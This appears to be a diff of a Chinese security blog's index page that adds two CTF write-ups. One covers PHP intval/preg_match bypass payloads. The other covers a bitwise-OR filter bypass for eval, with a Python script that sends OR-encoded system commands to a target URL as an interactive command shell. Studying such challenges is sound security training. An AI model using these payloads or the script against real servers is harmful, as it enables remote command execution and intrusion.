@@ -73,6 +73,163 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-PHP特性题目" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/" class="article-date">
+  <time class="dt-published" datetime="2025-04-27T07:47:49.000Z" itemprop="datePublished">2025-04-27</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/PHP%E7%89%B9%E6%80%A7/">PHP特性</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/">PHP 特性题目</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>解题思路</strong></p>
+<ul>
+<li><p><code>preg_match()</code> 函数传入的参数只能是字符串，如果传入数组会报错，返回 <code>FALSE</code> 。</p>
+</li>
+<li><p><code>intval()</code> 函数将变量转换为整数类型。</p>
+</li>
+<li><p>当字符串是纯数字时，能正常转换为整数。</p>
+</li>
+<li><p>若字符串开头不是数字，转换结果为 0。</p>
+</li>
+<li><p>字符串开头为数字，会把开头的数字部分转换为整数，其他省略。</p>
+</li>
+<li><p>若 <code>intval()</code> 函数传入值为数组，当数组为空时返回 0 ，数组不为空时返回 1 。</p>
+</li>
+<li><p>构造 Payload ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1</span><br></pre></td></tr></table></figure>
+
+<p><strong>tips</strong>：在 URL 参数名后面加上 <code>[]</code> 来表明这是一个数组参数，每个数组元素作为一个单独的参数键值对，参数名相同，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1&amp;num[]=2&amp;num[]=3</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>解题思路</strong></p>
+<ul>
+<li><p><code>===</code> 参考 JavaScript ，不仅数值要相等，数据类型也要相等。</p>
+</li>
+<li><p><code>intval($num,0)</code> ：当参数二为 <code>0</code> 时，表示根据字符串格式自动选择合适的进制来完成转换。</p>
+</li>
+<li><p>构造 Payload ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117C</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=+4476</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=4476+1-1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=4476e1  （科学计数法）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=4476&#x27;  （开头为数字时会把开头的数字部分转换为数字，其他忽略）</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>解题思路</strong></p>
+<ul>
+<li><p><code>/^php$/im</code> ：按行匹配，不区分大小写，匹配是否有一行的内容完全对应 <code>php</code> 。</p>
+</li>
+<li><p><code>/^php$/i</code> ：不区分大小写，匹配整段字符串的内容是否为 <code>php</code> 。</p>
+</li>
+<li><p>注意：按行匹配是以换行符为每行的结尾来区分每行、进行匹配的，也就是说下面这种情况只能算一行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=php%0A</span><br></pre></td></tr></table></figure>
+
+<p>如果是下面这种情况就算两行，也就是本题 Payload ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0Aphp</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://traveler2000.github.io/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/" data-id="cm9znqrjq000ceouh6334b0ep" data-title="PHP 特性题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-利用或运算活字印刷" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/" class="article-date">
+  <time class="dt-published" datetime="2025-04-27T05:44:07.000Z" itemprop="datePublished">2025-04-27</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/">利用或运算活字印刷</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>本题过滤了大量字符，但留了 <code>|</code> 运算符未被过滤，则可通过<strong>按位或运算</strong>逐字得到我们要执行的命令。</p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p><code>|</code> 运算符指按位或运算，可将数值、字符等在二进制层面进行或运算：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a&quot;</span> | <span class="string">&quot;b&quot;</span>;</span><br><span class="line"><span class="comment"># 01100001 （字符 &quot;a&quot; 的 ASCII 码值 97 转换为二进制）</span></span><br><span class="line"><span class="comment"># 01100010 （字符 &quot;b&quot; 的 ASCII 码值 98 转换为二进制）</span></span><br><span class="line"><span class="comment"># 输出 c （ 01100011 ，字符 &quot;c&quot; 的 ASCII 码值 98 转换为二进制）</span></span><br></pre></td></tr></table></figure>
+
+<p>了解了原理，看看大佬（[羽](<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">ctfshow web入门 web41_ctfshow web41-CSDN博客</a>)）写的脚本吧：</p>
+<p>脚本一（PHP）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;  <span class="comment"># 遍历 0 到 255 （有冗余，其实到 127 即可）</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;  <span class="comment"># 补齐小于 16 的十六进制数长度</span></span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);  <span class="comment"># dechex() 函数将十进制转换为十六进制</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;  <span class="comment"># hex2bin() 函数将十六进制数值转换为原始二进制数据，如果有对应的 ASCII 字符，则输出字符</span></span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;  <span class="comment"># 只有两个字符都未被过滤的情况下，才会用于合成被过滤的字符，否则不进行任何操作</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;  <span class="comment"># URL 编码前 128 位与 ASCII 码一致</span></span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;  <span class="comment"># ASCII 码前 32 位是控制字符，不可打印且无可见意义（但可用于或运算）；第 128 位是删除符，不可打印</span></span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;  <span class="comment"># 在 rce_or.txt 文件中在每行按照 A %01 %40 这样的形式拼接字符串</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>
+
+<p>脚本二（Python）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="comment"># 运行时在命令行中输入 python exp.py &lt;目标url&gt;</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *  <span class="comment"># 会将 sys 模块中的所有公共对象导入到当前命名空间，所以下面可以直接使用 argv 而无需使用 sys. 前缀</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):  <span class="comment"># 纠错机制，格式错误程序会正常退出</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]  <span class="comment"># 将用户输入的第二个参数作为 URL （注意“python exp.py &lt;url&gt;”中首个参数从脚本文件名开始而不是从 python 开始）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()  <span class="comment"># 每次循环文件指针后移一位， readline() 读取下一行</span></span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span>  <span class="comment"># 若读取到文件末尾都没对应字符，退出循环</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]  <span class="comment"># 分别读取每行三个部分如 A %01 %40 的内容</span></span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span>  <span class="comment"># (&quot;...&quot;|&quot;...&quot;) 拼接出准备与运算的字符串</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))  <span class="comment"># 将函数与命令拼接为 (&quot;system&quot;)(&quot;ls&quot;) 的形式（等价于 system(&quot;ls&quot;) ，此乃变量函数机制，PHP 特性）</span></span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)  <span class="comment"># URL 解码</span></span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure>
+
+<p>后面如果遇到可以用或运算活字印刷的，可以改一下该脚本或者自己写类似的脚本。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://traveler2000.github.io/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/" data-id="cm9znqrjw0019eouh34iocwc2" data-title="利用或运算活字印刷" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-GET与POST数组相关知识" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" class="article-date">
@@ -114,7 +271,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" data-id="cm9wms3l30001kcuh3jm8bbze" data-title="$_GET 与 $_POST 数组相关知识" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" data-id="cm9znqrjl0003eouhe2k467hh" data-title="$_GET 与 $_POST 数组相关知识" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -197,7 +354,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/" data-id="cm9wms3ld000ikcuhdrhj39l8" data-title="filter 伪协议绕过 die（Web87）" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/" data-id="cm9znqrjt000peouhhsenayol" data-title="filter 伪协议绕过 die（Web87）" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -260,7 +417,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" data-id="cm9wms3lr0031kcuhgaqbcq7b" data-title="条件竞争变体题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" data-id="cm9znqrk10026eouh8nhk4ia8" data-title="条件竞争变体题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -600,7 +757,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/24/Python-requests/" data-id="cm9wms3l90007kcuh6wbbhdiu" data-title="Python-requests" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/24/Python-requests/" data-id="cm9znqrjo0008eouh4flzd5zc" data-title="Python-requests" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -685,7 +842,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/" data-id="cm9wms3l80006kcuh77fn7nes" data-title="Python-面向对象入门" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/" data-id="cm9znqrjo0007eouh5w7ka9sw" data-title="Python-面向对象入门" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -821,7 +978,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/20/Session/" data-id="cm9wms3la000bkcuhg2cp17lh" data-title="Session" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/20/Session/" data-id="cm9znqrjt000neouhgpmkc1m3" data-title="Session" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -924,7 +1081,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" data-id="cm9wms3lr0034kcuhessf40i2" data-title="条件竞争漏洞与 Session 的文件上传进度追踪功能" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" data-id="cm9znqrk1002beouh0tvm0zrp" data-title="条件竞争漏洞与 Session 的文件上传进度追踪功能" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -1000,137 +1157,11 @@
       
     </div>
     <footer class="article-footer">
